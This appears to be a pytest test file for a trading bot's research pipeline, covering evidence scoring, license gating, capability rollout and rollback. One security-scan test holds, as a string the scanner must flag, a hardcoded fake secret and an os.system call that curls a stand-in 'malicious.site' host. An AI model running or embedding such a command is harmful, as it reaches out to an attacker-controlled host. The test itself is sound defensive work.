import pytest
import asyncio
from datetime import datetime

from trading_bot.research.research_os import ResearchWorkspace
from trading_bot.research.eip.models import (
    SourceType,
    CapabilityDomain,
    EvidencePayload,
    DistilledCapability,
    EIPProposal
)
from trading_bot.research.eip.adapters import (
    GitHubAdapter,
    ArxivAdapter,
    CreatorAdapter,
    FrontierModelAdapter,
    PapersWithCodeAdapter,
    HuggingFaceAdapter,
    BenchmarkAdapter,
    TechnicalBlogAdapter
)
from trading_bot.research.eip.eqe import EvidenceQualityEngine
from trading_bot.research.eip.pipeline import EIPPipeline
from trading_bot.research.eip.registry import (
    UniversalCapabilityRegistry,
    EIPRolloutManager,
    EIPRollbackManager
)


@pytest.fixture
def workspace():
    """Initializes central Quantitative Research Workspace."""
    return ResearchWorkspace()


@pytest.fixture
def eqe():
    """Initializes Evidence Quality Engine."""
    return EvidenceQualityEngine()


@pytest.fixture
def pipeline():
    """Initializes EIP shared pipeline."""
    return EIPPipeline()


@pytest.fixture
def registry(workspace):
    """Initializes Universal Capability Registry."""
    return UniversalCapabilityRegistry(workspace)


@pytest.mark.asyncio
async def test_all_source_adapters():
    """Verifies all 8 pluggable source adapters collect structured evidence payloads."""
    github = GitHubAdapter()
    arxiv = ArxivAdapter()
    creator = CreatorAdapter()
    frontier = FrontierModelAdapter()
    pwc = PapersWithCodeAdapter()
    hf = HuggingFaceAdapter()
    benchmark = BenchmarkAdapter()
    blog = TechnicalBlogAdapter()

    payload_gh = await github.collect_evidence("Alpha/RiskEngine")
    payload_arxiv = await arxiv.collect_evidence("2603.1092")
    payload_creator = await creator.collect_evidence("scaling_blueprint")
    payload_frontier = await frontier.collect_evidence("claude_4_reasoning")
    payload_pwc = await pwc.collect_evidence("forecasting_attention")
    payload_hf = await hf.collect_evidence("AlphaAlgo/QuantModel")
    payload_bench = await benchmark.collect_evidence("order_processing_speed")
    payload_blog = await blog.collect_evidence("outage_post_mortem")

    assert payload_gh.source_type == SourceType.GITHUB
    assert payload_arxiv.source_type == SourceType.ARXIV
    assert payload_creator.source_type == SourceType.CREATOR
    assert payload_frontier.source_type == SourceType.FRONTIER_MODEL
    assert payload_pwc.source_type == SourceType.PAPERS_WITH_CODE
    assert payload_hf.source_type == SourceType.HUGGING_FACE
    assert payload_bench.source_type == SourceType.BENCHMARK
    assert payload_blog.source_type == SourceType.TECHNICAL_BLOG


def test_evidence_quality_engine_weighting_and_hype_penalization(eqe):
    """Verifies EQE weights claims based on source reliability and penalizes marketing hype."""
    # 1. Scientific benchmark (Highest reliability)
    bench_payload = EvidencePayload(
        source_type=SourceType.BENCHMARK,
        source_name="speed_test",
        source_url="https://benchmarks.org",
        version_id="q1",
        collector_author="Scout",
        claims={"peer_reviewed": True},
        code_samples=["def run_test(): return True"],
        readme_content="Scientific latency benchmarks for tick processors."
    )
    report_bench = eqe.evaluate_payload(bench_payload)
    assert report_bench.base_weight == 1.0
    assert report_bench.passed_eq_gate is True
    assert report_bench.final_quality_score > 0.80

    # 2. Creator blueprint containing hype terms (Should be penalized and discounted)
    hype_payload = EvidencePayload(
        source_type=SourceType.CREATOR,
        source_name="100x_passive_income",
        source_url="https://creator.co",
        version_id="v1",
        collector_author="Scout",
        claims={},
        code_samples=[],
        readme_content="Discover our 100x passive income funnel blueprint for fast financial freedom!"
    )
    report_hype = eqe.evaluate_payload(hype_payload)
    assert report_hype.base_weight == 0.25
    assert "marketing_hype_or_unsupported_claims_detected" in report_hype.warnings
    assert report_hype.passed_eq_gate is False  # Fails the 0.40 gate threshold
    assert report_hype.final_quality_score < 0.20


def test_pipeline_domain_classification(pipeline):
    """Verifies that the EIP pipeline correctly classifies domains (Cognitive, Algorithmic, Business, Infrastructure)."""
    # Cognitive domain evaluation
    frontier_payload = EvidencePayload(
        source_type=SourceType.FRONTIER_MODEL,
        source_name="GPT-5",
        source_url="https://openai.com",
        version_id="v1",
        collector_author="Scout",
        claims={}
    )
    domain_frontier = pipeline.classify_domain(frontier_payload)
    assert domain_frontier == CapabilityDomain.COGNITIVE

    # Business domain evaluation
    creator_payload = EvidencePayload(
        source_type=SourceType.CREATOR,
        source_name="agency_offer",
        source_url="https://creator.co",
        version_id="v1",
        collector_author="Scout",
        claims={}
    )
    domain_creator = pipeline.classify_domain(creator_payload)
    assert domain_creator == CapabilityDomain.BUSINESS


def test_pipeline_ast_security_scanning(pipeline):
    """Verifies AST-based static scan blocks forbidden calls and handles fallback regex audits."""
    # 1. Clean secure code sample
    secure_code = [
        "def compute_ema(prices, span=20):\n"
        "    return prices.ewm(span=span).mean()\n"
    ]
    is_secure, warnings = pipeline.perform_ast_security_scan(secure_code)
    assert is_secure is True
    assert len(warnings) == 0

    # 2. Unsafe code sample containing OS system call and token assignments
    unsafe_code = [
        "app_secret = 'super_secret_token_123'\n"
        "def setup_env():\n"
        "    import os\n"
        "    os.system('curl malicious.site/hack')\n"
    ]
    is_secure_unsafe, warnings_unsafe = pipeline.perform_ast_security_scan(unsafe_code)
    assert is_secure_unsafe is False
    assert any("secret" in war or "system" in war for war in warnings_unsafe)


def test_license_audit_compliance(pipeline):
    """Verifies that EIP perfectly gates Apache/MIT and bans GPL copyleft licenses."""
    assert pipeline.audit_license("MIT") == "APPROVED"
    assert pipeline.audit_license("Apache-2.0") == "APPROVED"
    assert pipeline.audit_license("GPL-3.0") == "FORBIDDEN"
    assert pipeline.audit_license("AGPL-3.0") == "FORBIDDEN"


def test_pipeline_multi_domain_distillation_and_skill_compilation(pipeline):
    """Verifies that capability distillation isolates pure business/cognitive patterns and applies Weakness Inversion."""
    # 1. Cognitive planning model card
    payload = EvidencePayload(
        source_type=SourceType.FRONTIER_MODEL,
        source_name="planning_agent",
        source_url="https://frontier.ai",
        version_id="v1",
        collector_author="Scout",
        claims={}
    )
    cap = pipeline.distill_capability(payload, CapabilityDomain.COGNITIVE, 0.75)
    assert "Cognitive Pattern" in cap.extracted_pattern
    assert "Lack of cost budget bounding" in cap.original_weaknesses[0]

    # Compile skill
    skill_code = pipeline.compile_skill(cap)
    assert f"Skill_cap_planning_agent_v1" in skill_code
    assert "EIP Inversion Guard" in skill_code  # Pre-condition assertion injected


def test_universal_registry_rollout_and_automatic_rollback(registry, pipeline):
    """Verifies the complete EIP lifecycle: registration, governance gates, rollout, and automatic rollback on failures."""
    payload = EvidencePayload(
        source_type=SourceType.GITHUB,
        source_name="QuantEngine",
        source_url="https://github.com/QuantEngine",
        version_id="abc123commit",
        collector_author="Scout",
        claims={"domain": "algorithmic"},
        code_samples=["def calc(x): return x * 1.05"]
    )

    # 1. Distill & Compile
    cap = pipeline.distill_capability(payload, CapabilityDomain.ALGORITHMIC, 0.85)
    compiled_code = pipeline.compile_skill(cap)

    # 2. Register
    entry = registry.register_capability(cap, compiled_code, payload.source_url, payload.version_id)
    assert entry.capability_id == cap.capability_id
    assert entry.evidence_score == 0.85

    # 3. Submit proposal to governance
    proposal = registry.submit_proposal(cap, security_passed=True, license_status="APPROVED")
    assert proposal.stage == "sandbox"

    # Evaluate promotion (Algorithmic high-evidence allows automatic shadow promotion)
    promoted, msg = registry.evaluate_proposal(proposal.proposal_id)
    assert promoted is True
    assert proposal.stage == "shadow"

    # 4. Progressive Rollout
    rollout = EIPRolloutManager(registry)
    assert rollout.transition_stage(proposal.proposal_id, "canary") is True
    assert rollout.transition_stage(proposal.proposal_id, "limited_production") is True

    # Fail non-progressive transitions (sandbox idx -> limited)
    assert rollout.transition_stage(proposal.proposal_id, "sandbox") is False

    # 5. Deterministic instantaneous failure rollback
    rollback = EIPRollbackManager(rollout)
    success = rollback.trigger_automatic_rollback(proposal.proposal_id, "Performance degradation: Drawdown breach (>5%)")
    assert success is True
    assert proposal.stage == "sandbox"
    assert proposal.is_active is False  # Execution privileges completely suspended
